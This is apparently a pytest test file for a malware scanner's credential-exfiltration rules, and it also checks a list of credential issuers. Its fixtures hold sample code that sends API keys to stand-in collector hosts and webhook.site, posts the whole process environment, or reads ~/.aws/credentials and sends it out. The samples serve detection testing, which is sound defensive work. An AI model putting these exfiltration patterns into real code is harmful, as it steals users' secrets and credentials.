"""`SUSPECT.EXFIL.001` outside anything that runs on its own is recorded, unless the file names a
destination nobody sends their own credentials to (review 98)."""

from __future__ import annotations

import io
import json
import tarfile

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity
from cordon_scanner.foundation.paths import PackagePaths

UPLOAD = (
    "#!/bin/bash\n"
    'SCAN_URL="{destination}"\n'
    '[ -z "$COVERITY_SCAN_TOKEN" ] && echo "token must be set" && exit 1\n'
    'AUTH_RES=`curl -s --form project="$PROJECT" --form token="$COVERITY_SCAN_TOKEN" '
    "$SCAN_URL/api/upload_permitted`\n"
    "AUTH=`echo $AUTH_RES | ruby -e \"require 'json'; puts JSON[STDIN.read]['ok']\"`\n"
)


class TestOwnCredentialClient:
    @staticmethod
    def exfil(tmp_path, destination: str) -> list[Severity]:
        (tmp_path / "coverity.sh").write_text(
            UPLOAD.format(destination=destination), encoding="utf-8"
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.EXFIL.001"]

    def test_a_script_sending_its_token_to_its_service_is_recorded(self, tmp_path) -> None:
        found = self.exfil(tmp_path, "https://scan.example.com")
        assert found and all(severity <= Severity.LOW for severity in found)

    @pytest.mark.parametrize("destination", ["http://203.0.113.9", "https://webhook.site/abc"])
    def test_one_naming_a_drop_point_is_not(self, tmp_path, destination: str) -> None:
        found = self.exfil(tmp_path, destination)
        assert found and all(severity >= Severity.MEDIUM for severity in found)


class TestAProviderKeyGoesToItsProvider:
    """A key named for a service and sent to that service's host is the key doing its job. `DEEPSEEK_API_KEY` to
    `api.deepseek.com` at import was `MALWARE.EXFIL.001`, critical (aibrain's provider call). The vocabulary of issuers
    is data (`detect/data/credential-issuers.json`); what is sent beside the key, and where else, still decides."""

    CALL = (
        "import os\nimport urllib.request\n\n"
        'KEY = os.environ["{name}"]\n'
        'req = urllib.request.Request("{url}", data=b"{{}}", headers={{"Authorization": "Bearer " + KEY}})\n'
        "reply = urllib.request.urlopen(req).read()\n"
    )

    @staticmethod
    def rules(tmp_path, module: str) -> set[str]:
        members = {
            "pkg-1.0.0/PKG-INFO": "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n",
            "pkg-1.0.0/pyproject.toml": '[project]\nname = "pkg"\nversion = "1.0.0"\n',
            "pkg-1.0.0/pkg/__init__.py": "from . import client\n",
            "pkg-1.0.0/pkg/client.py": module,
        }
        archive = tmp_path / "pkg-1.0.0.tar.gz"
        with tarfile.open(archive, "w:gz") as out:
            for name, text in members.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                out.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    @pytest.mark.parametrize(
        ("name", "url"),
        [
            ("DEEPSEEK_API_KEY", "https://api.deepseek.com/chat/completions"),
            ("OPENAI_API_KEY", "https://api.openai.com/v1/chat/completions"),
        ],
    )
    def test_a_key_sent_to_its_own_provider_is_not_exfiltration(self, tmp_path, name, url) -> None:
        assert "MALWARE.EXFIL.001" not in self.rules(tmp_path, self.CALL.format(name=name, url=url))

    @pytest.mark.parametrize(
        ("name", "url"),
        [
            ("DEEPSEEK_API_KEY", "https://collector.example.net/u"),
            ("TELEGRAM_BOT_TOKEN", "https://api.telegram.org/bot/sendMessage"),
        ],
    )
    def test_a_host_that_is_not_the_issuer_is_still_exfiltration(self, tmp_path, name, url) -> None:
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, self.CALL.format(name=name, url=url))

    def test_a_second_host_beside_the_issuer_is_still_exfiltration(self, tmp_path) -> None:
        module = (
            self.CALL.format(
                name="DEEPSEEK_API_KEY", url="https://api.deepseek.com/chat/completions"
            )
            + 'urllib.request.urlopen(urllib.request.Request("https://collector.example.net/u", data=KEY.encode()))\n'
        )
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)

    def test_the_whole_environment_beside_the_key_is_still_exfiltration(self, tmp_path) -> None:
        module = (
            "import json\nimport os\nimport urllib.request\n\n"
            'KEY = os.environ["DEEPSEEK_API_KEY"]\n'
            "body = json.dumps(dict(os.environ)).encode()\n"
            'urllib.request.urlopen(urllib.request.Request("https://api.deepseek.com/chat/completions", data=body, '
            'headers={"Authorization": "Bearer " + KEY}))\n'
        )
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)

    def test_a_credential_file_beside_the_key_is_still_exfiltration(self, tmp_path) -> None:
        module = (
            "import os\nimport urllib.request\n\n"
            'KEY = os.environ["DEEPSEEK_API_KEY"]\n'
            'secret = open(os.path.expanduser("~/.aws/credentials")).read()\n'
            'urllib.request.urlopen(urllib.request.Request("https://api.deepseek.com/chat/completions", '
            'data=secret.encode(), headers={"Authorization": "Bearer " + KEY}))\n'
        )
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)


class TestAUnitThatNamesNoIssuerIsUnchanged:
    """The vocabulary of issuers only ever clears a window, and only for a unit that names one of its variables. For a unit that
    names none the findings are the same with it and without it (the pair measured on a random 1,000 of the PyPI benign units
    that name none relies on this)."""

    MODULES = (
        # a credential read and a request to a host nobody issues it for
        'import os\nimport urllib.request\n\nKEY = os.environ["ACME_SECRET"]\n'
        'urllib.request.urlopen(urllib.request.Request("https://collector.example.net/u", data=KEY.encode()))\n',
        # the same, to the issuer of a forge token (the existing excuse, untouched by the vocabulary)
        'import os\nimport urllib.request\n\nKEY = os.environ["GITHUB_TOKEN"]\n'
        'urllib.request.urlopen(urllib.request.Request("https://api.github.com/user", headers={"Authorization": KEY}))\n',
        # no credential at all
        'import urllib.request\n\nurllib.request.urlopen("https://example.com/status")\n',
        # the whole environment sent to an unlisted host
        'import json\nimport os\nimport urllib.request\n\nurllib.request.urlopen(urllib.request.Request("https://collector.example.net/u", '
        "data=json.dumps(dict(os.environ)).encode()))\n",
    )

    @staticmethod
    def findings(tmp_path, module: str) -> list[tuple]:
        members = {
            "pkg-1.0.0/PKG-INFO": "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n",
            "pkg-1.0.0/pyproject.toml": '[project]\nname = "pkg"\nversion = "1.0.0"\n',
            "pkg-1.0.0/pkg/__init__.py": "from . import client\n",
            "pkg-1.0.0/pkg/client.py": module,
        }
        archive = tmp_path / "pkg-1.0.0.tar.gz"
        with tarfile.open(archive, "w:gz") as out:
            for name, text in members.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                out.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return sorted(
            (f.rule_id, f.severity.name, f.confidence.name, f.location.path, f.location.line)
            for f in result.findings
        )

    @pytest.mark.parametrize("index", range(len(MODULES)))
    def test_findings_are_the_same_with_and_without_the_vocabulary(
        self, tmp_path, monkeypatch, index: int
    ) -> None:
        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse

        module = self.MODULES[index]
        with_it = self.findings(tmp_path, module)
        monkeypatch.setattr(LegitimateUse, "issuer_vocabulary", lambda: ())
        other = tmp_path / "again"
        other.mkdir()
        without_it = self.findings(other, module)
        assert with_it == without_it


class TestTheVocabularyOfIssuers:
    DATA = PackagePaths.data("detect")

    def rows(self) -> list[dict]:
        return json.loads((self.DATA / "credential-issuers.json").read_text(encoding="utf-8"))

    def test_no_code_hosting_or_registry_token_is_in_it(self) -> None:
        names = [n for row in self.rows() for n in row["names"]]
        forbidden = (
            "GITHUB",
            "GH_",
            "GITLAB",
            "CI_",
            "NPM",
            "NODE_AUTH",
            "PYPI",
            "TWINE",
            "DOCKER",
            "CARGO",
            "GEM_",
            "RUBYGEMS",
            "NUGET",
            "HF_",
            "HUGGINGFACE",
        )
        assert [n for n in names if n.startswith(forbidden)] == []
        hosts = [h for row in self.rows() for h in row["hosts"]]
        assert [
            h
            for h in hosts
            if h.endswith(
                (
                    "github.com",
                    "gitlab.com",
                    "npmjs.org",
                    "npmjs.com",
                    "pypi.org",
                    "docker.io",
                    "crates.io",
                    "huggingface.co",
                )
            )
        ] == []

    def test_no_chat_or_webhook_endpoint_is_in_it(self) -> None:
        endpoints = json.loads((self.DATA / "chat-endpoints.json").read_text(encoding="utf-8"))
        chat_hosts = {e.split("/", 1)[0].lower() for e in endpoints}
        for row in self.rows():
            for host in row["hosts"]:
                for chat in chat_hosts:
                    assert not (
                        host == chat or host.endswith("." + chat) or chat.endswith("." + host)
                    ), (host, chat)

    def test_every_row_names_a_service_a_prefix_and_a_host(self) -> None:
        for row in self.rows():
            assert row["service"] and row["names"] and row["hosts"]
            assert all(n.isupper() or n.replace("_", "").isalnum() for n in row["names"])
